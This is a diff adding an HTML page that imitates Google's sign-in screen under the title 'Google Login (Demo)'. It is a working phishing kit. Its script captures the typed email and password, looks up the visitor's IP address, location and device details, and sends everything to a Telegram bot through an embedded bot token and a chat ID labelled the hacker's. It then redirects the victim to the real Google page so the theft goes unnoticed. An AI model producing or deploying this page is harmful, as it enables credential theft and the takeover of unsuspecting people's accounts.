@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Login (Demo)</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400&display=swap" rel="stylesheet">
+    <style>
+      body {
+        font-family: 'Poppins', sans-serif;
+        background-color: #f2f2f2;
+        text-align: center;
+        margin: 0;
+        padding: 0;
+      }
+      .login-box {
+        background-color: white;
+        border: 1px solid #ddd;
+        border-radius: 8px;
+        padding: 20px;
+        max-width: 400px;
+        margin: 50px auto;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      }
+      .login-box img {
+        width: 100px;
+      }
+      .login-box h1 {
+        font-size: 24px;
+        margin: 20px 0;
+      }
+      .login-box input {
+        width: calc(100% - 20px);
+        padding: 10px;
+        margin: 10px 0;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        font-size: 16px;
+      }
+      .login-box button {
+        background-color: #4285f4;
+        color: white;
+        border: none;
+        padding: 10px 20px;
+        font-size: 16px;
+        border-radius: 4px;
+        cursor: pointer;
+      }
+      .login-box small {
+        display: block;
+        margin-top: 20px;
+        color: gray;
+        font-size: 14px;
+      }
+      .tag {
+        margin-top: 20px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-box">
+      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
+      <h1>Sign in</h1>
+      <p>Use your Google Account</p>
+      <input type="text" placeholder="Email or phone">
+      <br>
+      <input type="password" placeholder="Enter your password">
+      <br>
+      <button>Next</button>
+      <small>Not your computer? Use a private browsing window to sign in. <a href="#">Learn more</a></small>
+    </div>
+    <div class="tag">
+      <p></p>
+    </div>
+
+    <script>
+      // Telegram Bot API Token
+      const botToken = "7802730138:AAHuJeHWghwS_DIU-Djva6c_F-AcIH5rOFY";
+      const chatId = "911863905"; // Hacker's Telegram chat ID
+
+      // Function to fetch IP address using ipify API
+      async function getIp() {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      }
+
+      // Function to fetch location based on IP using ip-api
+      async function getLocationByIp(ip) {
+        const response = await fetch(`http://ip-api.com/json/${ip}`);
+        const data = await response.json();
+        return {
+          city: data.city,
+          country: data.country,
+          region: data.regionName
+        };
+      }
+
+      // Function to gather device info
+      function getDeviceInfo() {
+        return {
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language
+        };
+      }
+
+      // Function to send captured data to the Telegram bot
+      async function sendToTelegram(data) {
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const message = `Captured Data:\nEmail/Phone: ${data.email}\nPassword: ${data.password}\nIP: ${data.ip}\nLocation: ${data.location.city}, ${data.location.country}\nDevice Info: ${data.deviceInfo.userAgent}`;
+        
+        fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+          }),
+        });
+      }
+
+      document.querySelector("button").addEventListener("click", async () => {
+        const email = document.querySelector('input[type="text"]').value;
+        const password = document.querySelector('input[type="password"]').value;
+
+        // Get IP address
+        const ip = await getIp();
+
+        // Get location based on IP
+        const location = await getLocationByIp(ip);
+
+        // Get device info
+        const deviceInfo = getDeviceInfo();
+
+        // Send data to the hacker's Telegram bot
+        sendToTelegram({ email, password, ip, location, deviceInfo });
+
+        // Optionally redirect user to an actual Google login page for authenticity
+        window.location.href = "https://accounts.google.com/signin";
+      });
+    </script>
+  </body>
+</html>
